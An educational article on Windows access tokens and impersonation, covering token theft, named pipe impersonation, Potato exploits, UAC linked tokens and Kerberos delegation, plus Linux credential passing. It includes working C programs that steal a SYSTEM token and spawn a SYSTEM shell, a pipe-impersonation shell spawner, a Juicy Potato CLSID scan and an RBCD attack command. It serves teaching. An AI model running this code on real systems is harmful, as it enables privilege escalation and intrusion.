Token Impersonation

Windows access token structure, token theft, named pipe impersonation, Potato exploits (SeImpersonatePrivilege), UAC token filtering, Kerberos delegation, and Linux credential passing via Unix sockets.

Overview

Windows access tokens are the kernel objects that carry a process identity, and stealing or impersonating one turns a foothold into SYSTEM. This article covers token structure, primary versus impersonation tokens, named pipe impersonation with SeImpersonatePrivilege , the Potato exploit family, UAC token filtering, and Kerberos delegation. It closes with the Linux equivalents: UID transitions, capabilities, and SCM_CREDENTIALS passing over Unix domain sockets. By the end you can explain each privilege escalation primitive and where it fails.

Required Reading

  • Processes - process credentials, UID/GID, kernel credential structures
  • Authentication - authentication mechanisms, Kerberos, Pluggable Authentication Modules ( PAM )
  • Authorization - access control models, discretionary and mandatory access control, ACL rules
  • Unix Permissions - UID/EUID/SUID, setuid/seteuid system calls
  • Capabilities - Linux capabilities model, ambient capabilities

The Windows Access Token

Every Windows process carries an access token - a kernel object representing the process's security context. When a thread opens a file, accesses a registry key, or interacts with any securable object, the Security Reference Monitor (SRM) compares the token against the object's ACL .

An access token is created at logon by LSASS and contains:

Field Description Example
User SID Who you are S-1-5-21-3852-1155-500(Administrator)
Group SIDs Group memberships Domain Admins, Remote Desktop Users
Privileges Local system rights SeDebugPrivilege, SeImpersonatePrivilege
Default DACL ACL applied to created objects Default owner rights
Token Type Primary vs Impersonation Process vs thread level
Impersonation Level How far impersonation reaches Identification, Impersonation, Delegation
Integrity Level UAC sandboxing Low, Medium, High, System
Session ID Terminal Services session Session 0 (services), Session 1+ (console)
Logon SID Unique per logon session Identifies the logon
Origin Token source LSASS logon, NtCreateToken, duplication

Enumerate Your Token

# PowerShell — full token dump

Token Info in C

/*
 * token_info.c — Read process and thread token info
 * Cross-compile: x86_64-w64-mingw32-gcc -o token_info.exe token_info.c
 */

#include <windows.h>
#include <stdio.h>

void print_token_details(HANDLE hToken)
{
    DWORD tokenType = 0, returnLen = 0;

    if (GetTokenInformation(hToken, TokenType,
        &tokenType, sizeof(tokenType), &returnLen)) {
        printf("  Type: %s\n",
            tokenType == TokenPrimary ? "Primary" : "Impersonation");
    }

    if (tokenType == TokenImpersonation) {
        SECURITY_IMPERSONATION_LEVEL impLevel;
        if (GetTokenInformation(hToken, TokenImpersonationLevel,
            &impLevel, sizeof(impLevel), &returnLen)) {
            const char *levels[] = {
                "Anonymous", "Identification", "Impersonation", "Delegation"
            };
            printf("  ImpersonationLevel: %s\n", levels[impLevel]);
        }
    }

    /* Get user SID */
    BYTE tokenUserBuf[256];
    PTOKEN_USER tokenUser = (PTOKEN_USER)tokenUserBuf;
    if (GetTokenInformation(hToken, TokenUser,
        tokenUser, sizeof(tokenUserBuf), &returnLen)) {
        LPSTR sidString;
        ConvertSidToStringSidA(tokenUser->User.Sid, &sidString);
        printf("  User SID: %s\n", sidString);
        LocalFree(sidString);
    }
}

int main(void)
{
    HANDLE hProcessToken, hThreadToken;

    if (OpenProcessToken(GetCurrentProcess(),
        TOKEN_QUERY, &hProcessToken)) {
        printf("Process primary token:\n");
        print_token_details(hProcessToken);
        CloseHandle(hProcessToken);
    }

    if (OpenThreadToken(GetCurrentThread(),
        TOKEN_QUERY, FALSE, &hThreadToken)) {
        printf("Thread token:\n");
        print_token_details(hThreadToken);
        CloseHandle(hThreadToken);
    } else {
        printf("Thread token: not impersonating (using process token)\n");
    }

    return 0;
}

Token Types: Primary vs Impersonation

Primary Token

Attached to a process at creation time. Contains the complete security context. Every process has exactly one primary token. Threads inherit the process primary token by default unless explicitly assigned an impersonation token.

Impersonation Token

Attached to a thread. Created when a server impersonates a client (named pipe, RPC , COM). The thread runs with the client's security context. The thread reverts to its process primary token via RevertToSelf() .

Token Lifecycle

User logs on
    │
    ▼
LSASS creates primary token
    │
    ▼
winlogon/userinit starts first process with this primary token
    │
    ▼
Child processes inherit primary token (via CreateProcess)
    │                       │
    │                       ▼
    │               Server: accept client connection
    │                  (named pipe, RPC, COM)
    │                       │
    │                       ▼
    │               Create impersonation token for client
    │                       │
    │                       ▼
    │               Thread: ImpersonateLoggedOnUser()
    │                       │
    │                       ▼
    │               Thread runs as client user
    │                       │
    │                       ▼
    │               Thread: RevertToSelf() — back to process token
    │
    ▼
Process exits — primary token destroyed

Impersonation Levels

When a thread impersonates, the level determines how much authority the impersonated identity carries:

Level Value Access Local Access Remote
SecurityAnonymous 1 No No
SecurityIdentification 2 Inspect SIDs only No
SecurityImpersonation 3 Yes (full local) No
SecurityDelegation 4 Yes (full local) Yes (Kerberos)

The client sets the maximum impersonation level when connecting. A server cannot exceed what the client grants. For named pipes, the client specifies this in CreateFile 's dwFlagsAndAttributes parameter via SECURITY_SQOS_PRESENT . 

/*
 * named_pipe_client.c — Connect with specific impersonation level
 * Compile: x86_64-w64-mingw32-gcc -o pipe_client.exe named_pipe_client.c
 *
 * Run this: pipe_client.exe
 * Meanwhile, a server on \\.\pipe\testpipe reads the impersonation level.
 */

#include <windows.h>
#include <stdio.h>

int main(void)
{
    /* Connect with SecurityImpersonation — the server can impersonate us */
    HANDLE hPipe = CreateFileA(
        "\\\\\\\\.\\\\pipe\\\\testpipe",
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL);

    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[-] Could not connect to pipe (no server listening?)\n");
        printf("    CreateFileA error: %lu\n", GetLastError());
        return 1;
    }

    /* Send our token info over the pipe */
    HANDLE hToken;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);

    /* Server now calls ImpersonateNamedPipeClient(hPipe)
     * and can access local resources as us. */
    printf("[+] Connected. Server can impersonate at our allowed level.\n");

    /* Wait for server to process */
    Sleep(5000);
    CloseHandle(hPipe);
    return 0;
}

Token Stealing - The Core Primitive

Token stealing duplicates a token from another process and assigns it to your thread. The classic meterpreter flow: 

1. Enable SeDebugPrivilege (required to open SYSTEM tokens)
2. Enumerate processes via CreateToolhelp32Snapshot
3. For each process, open with PROCESS_QUERY_INFORMATION
4. OpenProcessToken with TOKEN_DUPLICATE | TOKEN_IMPERSONATE
5. DuplicateTokenEx to create a primary token
6. CreateProcessWithTokenW to spawn a shell with the stolen token
						
/*
 * token_steal.c — Steal a SYSTEM token and spawn a shell
 * Cross-compile: x86_64-w64-mingw32-gcc -o token_steal.exe token_steal.c
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

BOOL enable_privilege(LPCSTR privilegeName)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    if (!LookupPrivilegeValueA(NULL, privilegeName, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = AdjustTokenPrivileges(
        hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return result && GetLastError() == ERROR_SUCCESS;
}

DWORD find_system_process(void)
{
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(entry);
    DWORD pid = 0;

    if (Process32First(snapshot, &entry)) {
        do {
            /* winlogon.exe, lsass.exe, services.exe run as SYSTEM */
            if (_stricmp(entry.szExeFile, "winlogon.exe") == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return pid;
}

int main(void)
{
    /* Step 1: Enable SeDebugPrivilege */
    printf("[*] Enabling SeDebugPrivilege...\n");
    if (!enable_privilege(SE_DEBUG_NAME)) {
        printf("[-] SeDebugPrivilege not available (run as admin)\n");
        return 1;
    }
    printf("[+] SeDebugPrivilege enabled\n");

    /* Step 2: Find a SYSTEM process */
    DWORD systemPid = find_system_process();
    if (!systemPid) {
        printf("[-] No SYSTEM process found\n");
        return 1;
    }
    printf("[+] Found SYSTEM process: PID %lu\n", systemPid);

    /* Step 3: Open the SYSTEM process and its token */
    HANDLE hProcess = OpenProcess(
        PROCESS_QUERY_INFORMATION, FALSE, systemPid);
    if (!hProcess) {
        printf("[-] OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }

    HANDLE hSystemToken;
    if (!OpenProcessToken(hProcess,
        TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY,
        &hSystemToken)) {
        printf("[-] OpenProcessToken failed: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Opened SYSTEM token\n");

    /* Step 4: Duplicate the token as a primary token */
    HANDLE hDupToken;
    if (!DuplicateTokenEx(hSystemToken, MAXIMUM_ALLOWED, NULL,
        SecurityImpersonation, TokenPrimary, &hDupToken)) {
        printf("[-] DuplicateTokenEx failed: %lu\n", GetLastError());
        CloseHandle(hSystemToken);
        CloseHandle(hProcess);
        return 1;
    }

    /* Step 5: Spawn a process with the stolen token */
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.lpDesktop = "WinSta0\\Default";

    if (!CreateProcessWithTokenW(hDupToken, 0,
        L"cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcessWithTokenW failed: %lu\n", GetLastError());
    } else {
        printf("[+] SYSTEM shell created (PID: %lu)\n", pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    CloseHandle(hDupToken);
    CloseHandle(hSystemToken);
    CloseHandle(hProcess);
    return 0;
}

Named Pipe Impersonation

SeImpersonatePrivilege is granted by default to: - Local Administrators - Local Service accounts (including IIS, SQL Server) - Network Service account - SERVICE accounts

If your process holds SeImpersonatePrivilege , you can impersonate any user that connects to a resource you control. The attack pattern: 

[Attacker (with SeImpersonatePrivilege)]
    │
    ├── Create named pipe (e.g., \\.\pipe\spoolss)
    │
    ├── Trick SYSTEM into connecting to the pipe
    │       (NTLM reflection, COM activation, RPC callback)
    │
    ├── Wait for connection from SYSTEM
    │
    └── ImpersonateNamedPipeClient() → run as SYSTEM

PrintSpoofer / PipePotato Technique

PrintSpoofer exploits the fact that the Spooler service (running as SYSTEM) connects to a named pipe when a print job is queued. By creating a pipe with a specific name and triggering a print operation, SYSTEM connects and the attacker impersonates. 

/*
 * named_pipe_impersonate.c — Named pipe impersonation foundation
 * Cross-compile: x86_64-w64-mingw32-gcc -o np_impersonate.exe named_pipe_impersonate.c
 *
 * This demonstrates the core technique. Combined with a coercion
 * method (RPC, DCOM, printer bug), it becomes a Potato exploit.
 */

#include <windows.h>
#include <stdio.h>

int main(void)
{
    /* Check for SeImpersonatePrivilege */
    HANDLE hToken;
    BOOL hasImpersonate = FALSE;

    if (OpenProcessToken(GetCurrentProcess(),
        TOKEN_QUERY, &hToken)) {
        /* Check privilege */
        PRIVILEGE_SET privSet;
        LUID luid;
        LookupPrivilegeValueA(NULL, SE_IMPERSONATE_NAME, &luid);

        privSet.PrivilegeCount = 1;
        privSet.Control = PRIVILEGE_SET_ALL_NECESSARY;
        privSet.Privilege[0].Luid = luid;
        privSet.Privilege[0].Attributes = 0;

        if (PrivilegeCheck(hToken, &privSet, &hasImpersonate)) {
            printf("[%s] SeImpersonatePrivilege\n",
                hasImpersonate ? "+" : "-");
        }
        CloseHandle(hToken);
    }

    if (!hasImpersonate) {
        printf("[-] SeImpersonatePrivilege not available\n");
        return 1;
    }

    /* Create a named pipe */
    printf("[*] Creating named pipe: \\\\.\\pipe\\testimp\n");
    HANDLE hPipe = CreateNamedPipeA(
        "\\\\.\\pipe\\testimp",
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1,           /* max instances */
        0, 0, 0, NULL);

    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[-] CreateNamedPipe failed: %lu\n", GetLastError());
        return 1;
    }

    /* Wait for a client (SYSTEM) to connect */
    printf("[*] Waiting for client connection...\n");
    printf("[*] (In a real attack, trigger a SYSTEM process to connect)\n");

    if (!ConnectNamedPipe(hPipe, NULL) &&
        GetLastError() != ERROR_PIPE_CONNECTED) {
        printf("[-] ConnectNamedPipe failed: %lu\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }

    printf("[+] Client connected\n");

    /* Read a byte from the pipe */
    BYTE buf;
    DWORD bytesRead;
    ReadFile(hPipe, &buf, 1, &bytesRead, NULL);

    /* Impersonate the client */
    if (!ImpersonateNamedPipeClient(hPipe)) {
        printf("[-] ImpersonateNamedPipeClient failed: %lu\n",
            GetLastError());
        CloseHandle(hPipe);
        return 1;
    }

    printf("[+] Now impersonating the client\n");

    /* Verify the new identity */
    HANDLE hThreadToken;
    OpenThreadToken(GetCurrentThread(),
        TOKEN_QUERY | TOKEN_DUPLICATE, FALSE, &hThreadToken);

    BYTE userBuf[256];
    PTOKEN_USER tokenUser = (PTOKEN_USER)userBuf;
    DWORD returnLen;
    GetTokenInformation(hThreadToken, TokenUser,
        tokenUser, sizeof(userBuf), &returnLen);

    LPSTR sidString;
    ConvertSidToStringSidA(tokenUser->User.Sid, &sidString);
    printf("[+] Impersonated user SID: %s\n", sidString);
    LocalFree(sidString);

    /* As the impersonated user, spawn a process.
     * CreateProcessWithTokenW needs a primary token, so duplicate
     * the thread's impersonation token first. */
    HANDLE hPrimaryToken;
    if (!DuplicateTokenEx(hThreadToken, MAXIMUM_ALLOWED, NULL,
        SecurityImpersonation, TokenPrimary, &hPrimaryToken)) {
        printf("[-] DuplicateTokenEx failed: %lu\n", GetLastError());
        RevertToSelf();
        CloseHandle(hPipe);
        return 1;
    }

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.lpDesktop = "WinSta0\\Default";

    if (CreateProcessWithTokenW(hPrimaryToken, 0,
        L"cmd.exe", NULL, CREATE_NEW_CONSOLE,
        NULL, NULL, &si, &pi)) {
        printf("[+] Shell spawned as impersonated user (PID: %lu)\n",
            pi.dwProcessId);
    } else {
        printf("[-] CreateProcessWithTokenW failed: %lu\n",
            GetLastError());
    }

    CloseHandle(hPrimaryToken);
    CloseHandle(hThreadToken);
    RevertToSelf();
    CloseHandle(hPipe);
    return 0;
}

The Potato Exploit Family

The "Potato" exploit family chains SeImpersonatePrivilege with various coercion techniques to get SYSTEM to connect to the attacker-controlled pipe.

Exploit Coercion Method Works On
Hot Potato NBNS spoofing -> NTLM relay Win 7, 8, 10, Server 2008/2012
Rotten Potato DCOM activation + NTLM reflection Win 10 < 1809, Server 2016
Juicy Potato CLSID-based DCOM -> NTLM auth Win 10, Server 2012/2016, limited post-1809
Rogue Potato Remote OXID resolver Win 10 1809+, Server 2019
Sweet Potato EFSRPC callback + multiple triggers Win 10, Server 2019 (specific builds)
PrintSpoofer Spooler RPC -> named pipe Windows Server 2019, Win 10 1809+
GodPotato COM loopback + NETONLY impersonation Win 10/11, Server 2012-2022

The core workflow for all Potato variants:

[1] Create a named pipe (listening for SYSTEM)
[2] Find a COM interface / RPC endpoint that SYSTEM calls
[3] Configure the callback to point at the named pipe
[4] Trigger the COM/RPC call → SYSTEM connects to pipe
[5] ImpersonateNamedPipeClient() → run as SYSTEM
[6] DuplicateTokenEx() → get a primary token
[7] CreateProcessWithTokenW() → spawn SYSTEM shell

Juicy Potato CLSID

The CLSID (Class Identifier) determines which COM object SYSTEM instantiates. On a Windows 10 system, thousands of CLSIDs exist. The relevant ones for Juicy Potato are those with LaunchPermission that allow the current user to launch, and that run as SYSTEM: 

# Find viable CLSIDs for Juicy Potato
# Requires a test harness, but conceptually:
$regPath = "HKLM:\SOFTWARE\Classes\CLSID"
Get-ChildItem -Path $regPath | ForEach-Object {
    $clsid = $_.PSChildName
    $appId = (Get-ItemProperty -Path "$regPath\$clsid" -Name AppID -ErrorAction SilentlyContinue).AppID
    if ($appId) {
        # Check the AppID's launch permission
        $appIdPath = "HKLM:\SOFTWARE\Classes\AppID\$appId"
        $runAs = (Get-ItemProperty -Path $appIdPath -Name RunAs -ErrorAction SilentlyContinue).RunAs
        $localService = (Get-ItemProperty -Path $appIdPath -Name LocalService -ErrorAction SilentlyContinue).LocalService
        if ($runAs -eq "Interactive User" -or $localService) {
            Write-Host "Viable CLSID: $clsid (AppID: $appId)"
        }
    }
}

UAC Token Filtering and Linked Tokens

User Account Control ( UAC ) splits administrator accounts into two tokens:

  1. Elevated Token (Full Administrator) : Contains all administrator group SIDs and privileges. Used when a process is explicitly elevated ("Run as Administrator").
  2. Filtered Token (Standard User) : The administrator SID is marked DENY_ONLY , sensitive privileges are removed ( SeDebugPrivilege , SeImpersonatePrivilege ). Used for the default desktop session.

The filtered token is the administrator's primary token for normal operation. The elevated token is a linked token - the kernel maintains a link between them. 

Logon as "Administrator" (member of Administrators group)
    │
    ▼
LSASS creates full admin token
    │
    ▼
UAC module creates filtered token:
    ├── Removes Administrators group (marks DENY_ONLY)
    ├── Removes sensitive privileges
    └── Sets integrity level to Medium (from High)
    │
    ▼
Linked token created (full admin + filtered linked together)
    │
    ├── explorer.exe gets filtered token
    │
    └── When "Run as Administrator" clicked:
           LSASS retrieves linked elevated token
           New process created with elevated token

Token Kidnapping

If you're an administrator but running with the filtered token, you can recover the linked elevated token: 

/*
 * uac_bypass_token.c — Recover the linked elevated token (UAC bypass)
 * Cross-compile: x86_64-w64-mingw32-gcc -o uac_bypass.exe uac_bypass_token.c
 *
 * Technique: enumerate tokens via NtQuerySystemInformation,
 * find the linked elevated token for the current session,
 * duplicate and use it.
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>

/* Undocumented NT API */
typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength);

#define SystemExtendedProcessInformation 57

typedef struct {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER Spare[3];
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    ULONG BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    /* ... extended fields ... */
} SYSTEM_EXTENDED_PROCESS_INFORMATION, *PSYSTEM_EXTENDED_PROCESS_INFORMATION;

int main(void)
{
    /* The idea: enumerate all processes, find one running with
     * the elevated token for the current user session.
     * 
     * The classic approach uses RPCSS or other SYSTEM services
     * that use the linked token mechanism internally.
     *
     * Alternate technique (simpler): the UAC bypass via
     * elevated COM object instantiation:
     *   - Find an auto-elevated COM object
     *   - CoCreateInstance with elevation moniker
     *   - Execute code in the elevated context
     */

    printf("[*] UAC bypass via token manipulation requires:\n");
    printf("    1. Membership in Administrators group\n");
    printf("    2. Finding a process with the linked elevated token\n");
    printf("    3. Opening and duplicating that token\n");
    printf("    4. Creating a process with the elevated token\n\n");
    printf("[*] This bypasses the UAC consent prompt.\n");

    /* Full implementation requires undocumented structures.
     * The practical tools are:
     *   - meterpreter: getsystem (uses named pipe impersonation)
     *   - psexec -s (uses service creation to run as SYSTEM)
     */

    return 0;
}

Kerberos Delegation Tokens

Kerberos delegation allows a service to authenticate to other services on behalf of a user. The delegation token contains the user's TGT (Ticket Granting Ticket) or a service ticket. Abusing delegation tokens is a domain escalation technique.

Unconstrained Delegation

The service receives the user's full TGT. It can authenticate to any service as that user. The TGT is cached in LSASS on the server. Dumping LSASS on a server with unconstrained delegation yields domain admin TGTs. 

User ──► DC (get TGT) ──► Server with Unconstrained Delegation
                                    │
                                    ├── Receives user's TGT
                                    ├── Caches TGT in LSASS
                                    └── Can request tickets to any service as user

Constrained Delegation

The service receives a service ticket for specific back-end services only. The domain controller restricts which services can be delegated to. Abuse requires compromising the front-end service's account. 

User ──► DC ──► Frontend Server (Constrained Delegation to MSSQL)
                        │
                        ├── Can request service ticket for MSSQL as user
                        └── Cannot request tickets for other services

Resource-Based Constrained Delegation

The back-end service defines who can delegate to it. This is configured on the target service account's msDS-AllowedToActOnBehalfOfOtherIdentity attribute. If you control a computer account or have GenericWrite on the target, you can add yourself as a delegate. 

# Find computers with unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# Find users with constrained delegation
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation, msDS-AllowedToDelegateTo

# RBCD attack: add an account as allowed delegate
Set-ADComputer TARGET-PC -PrincipalsAllowedToDelegateToAccount ATTACKER-PC$
# Then use S4U2Self + S4U2Proxy to get a service ticket as any user

Linux Equivalent - Credential Passing

Linux does not have "access tokens" in the Windows sense. The equivalent mechanisms are:

UID/GID

Every process has a real, effective, saved, and filesystem UID. These are stored in the struct cred in the kernel and can be changed with setuid() , seteuid() , setresuid() . The kernel enforces restrictions on which transitions are allowed.

Capabilities

A per-thread bitmask that grants specific privileges (like CAP_SYS_PTRACE and CAP_NET_RAW ) without full root. The ambient capability set, added in Linux 4.3, lets an unprivileged program carry part of its permitted set across execve .

Unix Socket Credential Passing

SCM_CREDENTIALS ancillary data on Unix sockets allows the kernel to pass UID/GID/PID credentials between processes. This is the closest Linux equivalent to named pipe impersonation. 

/*
 * scm_credentials.c — Unix domain socket credential passing
 * Compile: gcc -o scm_cred scm_credentials.c
 *
 * Server: receives client's credentials from the kernel
 * Client: connects, kernel attaches its UID/GID/PID
 *
 * This is how dbus, polkit, and systemd verify caller identity.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/types.h>

#define SOCKET_PATH "/tmp/scm_demo.sock"

void run_server(void)
{
    int server_fd = socket(AF_UNIX, SOCK_STREAM, 0);
    struct sockaddr_un addr;
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, SOCKET_PATH, sizeof(addr.sun_path) - 1);

    unlink(SOCKET_PATH);
    bind(server_fd, (struct sockaddr *)&addr, sizeof(addr));
    listen(server_fd, 1);

    printf("[server] Listening on %s (PID: %d)\n", SOCKET_PATH, getpid());

    int client_fd = accept(server_fd, NULL, NULL);

    /* Enable SO_PASSCRED to receive credentials */
    int optval = 1;
    setsockopt(client_fd, SOL_SOCKET, SO_PASSCRED,
        &optval, sizeof(optval));

    /* Receive a message with ancillary credential data */
    char buf[256] = {0};
    struct msghdr msg = {0};
    struct iovec iov;
    iov.iov_base = buf;
    iov.iov_len = sizeof(buf);

    /* Space for credentials */
    union {
        struct cmsghdr cm;
        char control[CMSG_SPACE(sizeof(struct ucred))];
    } control_un;

    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = control_un.control;
    msg.msg_controllen = sizeof(control_un.control);

    ssize_t received = recvmsg(client_fd, &msg, 0);
    if (received < 0) {
        perror("recvmsg");
        exit(EXIT_FAILURE);
    }

    /* Extract credentials */
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    if (cmsg && cmsg->cmsg_level == SOL_SOCKET &&
        cmsg->cmsg_type == SCM_CREDENTIALS) {
        struct ucred *creds = (struct ucred *)CMSG_DATA(cmsg);
        printf("[server] Client credentials:\n");
        printf("  PID: %d\n", creds->pid);
        printf("  UID: %d\n", creds->uid);
        printf("  GID: %d\n", creds->gid);

        /* The kernel guarantees these are accurate.
         * Unlike getpeereid() (SO_PEERCRED), SCM_CREDENTIALS
         * is per-message and cannot be spoofed. */
    }

    close(client_fd);
    close(server_fd);
    unlink(SOCKET_PATH);
}

void run_client(void)
{
    /* Drop privileges to demonstrate credential passing */
    if (setuid(1000) < 0) {
        perror("setuid — run as root first to test");
    }

    int client_fd = socket(AF_UNIX, SOCK_STREAM, 0);
    struct sockaddr_un addr;
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, SOCKET_PATH, sizeof(addr.sun_path) - 1);

    /* Wait briefly for server to start */
    usleep(100000);

    if (connect(client_fd, (struct sockaddr *)&addr,
        sizeof(addr)) < 0) {
        perror("connect — server may not be running");
        exit(EXIT_FAILURE);
    }

    printf("[client] Connected. PID: %d, UID: %d, GID: %d\n",
        getpid(), getuid(), getgid());

    /* Send a message — the kernel will attach our credentials.
     * If SO_PASSCRED is set on the receiving socket, struct ucred
     * is appended automatically by the kernel. */
    char *msg = "hello";
    send(client_fd, msg, strlen(msg), 0);

    printf("[client] Message sent. Server received our real credentials.\n");
    close(client_fd);
}

int main(int argc, char **argv)
{
    if (argc < 2) {
        fprintf(stderr, "Usage: %s [server|client]\n", argv[0]);
        return EXIT_FAILURE;
    }

    if (strcmp(argv[1], "server") == 0) {
        run_server();
    } else if (strcmp(argv[1], "client") == 0) {
        run_client();
    } else {
        fprintf(stderr, "Usage: %s [server|client]\n", argv[0]);
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

Common Mistakes

  1. Forgetting to enable SeDebugPrivilege before opening SYSTEM tokens : Without it, OpenProcess on SYSTEM processes fails with ERROR_ACCESS_DENIED . Must be explicitly enabled even as Administrator.
  1. Using TokenPrimary for DuplicateTokenEx when you need TokenImpersonation : SetThreadToken requires an impersonation token. CreateProcessWithTokenW requires a primary token. Get the type right for your use case.
  1. Not checking 'GetLastError()' after ImpersonateNamedPipeClient : Success returns TRUE, but the impersonation level might be SecurityIdentification (can't actually use the token). Always check GetTokenInformation(TokenImpersonationLevel) .
  1. Assuming all Potato exploits work on all Windows versions : Microsoft has been systematically fixing the RPC and DC OM coercion methods. Juicy Potato stopped working on Windows 10 1809+. PrintSpoofer works on Server 2019 but requires the Spooler service. Sweet Potato uses EFS RPC which may be patched.
  1. Leaving the impersonation token active : After completing operations as another user, always call RevertToSelf() . Leaving an impersonation token active can cause unintended access denials and leave forensic traces.
  1. Assuming Linux setuid is the same as token impersonation : Linux setuid() is permanent (affects all threads in the process) and irreversible for unprivileged users. It's not an impersonation mechanism - it permanently changes the process identity. For temporary privilege changes, use seteuid() with a saved set-user-ID.
  1. Not understanding the difference between SO_PEERCRED and SCM_CREDENTIALS : getpeereid() / SO_PEERCRED returns the credentials the peer held at connect() time. SCM_CREDENTIALS is per-message, and the kernel attaches the sender's current credentials at sendmsg() time. Both are supplied by the kernel and cannot be spoofed by the sender, but SO_PEERCRED goes stale if the peer changes credentials after connecting.

Challenge

Write a Go tool that inspects the credentials of a process the way whoami /all does on Windows. It reads /proc/<pid>/status , parses the Uid: and Gid: lines (real, effective, saved, and filesystem IDs), and prints a warning when the real and effective IDs differ - the same signal a setuid binary or a credential transition leaves behind on Linux. 

package main

import (
	"bufio"
	"fmt"
	"os"
	"strconv"
	"strings"
)

func parseStatus(path string) (map[string][]int, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	values := make(map[string][]int)
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		fields := strings.Fields(scanner.Text())
		if len(fields) < 2 {
			continue
		}
		key := strings.TrimSuffix(fields[0], ":")
		if key != "Uid" && key != "Gid" {
			continue
		}
		nums := make([]int, 0, 4)
		for _, field := range fields[1:] {
			n, err := strconv.Atoi(field)
			if err != nil {
				break
			}
			nums = append(nums, n)
		}
		values[key] = nums
	}
	return values, scanner.Err()
}

func main() {
	if len(os.Args) != 2 {
		fmt.Fprintf(os.Stderr, "usage: %s <pid>\n", os.Args[0])
		os.Exit(1)
	}

	values, err := parseStatus("/proc/" + os.Args[1] + "/status")
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	for _, key := range []string{"Uid", "Gid"} {
		v := values[key]
		if len(v) < 4 {
			continue
		}
		fmt.Printf("%s real=%d effective=%d saved=%d fs=%d\n",
			key, v[0], v[1], v[2], v[3])
		if v[0] != v[1] {
			fmt.Printf("[!] %s mismatch: real and effective differ\n", key)
		}
	}
}
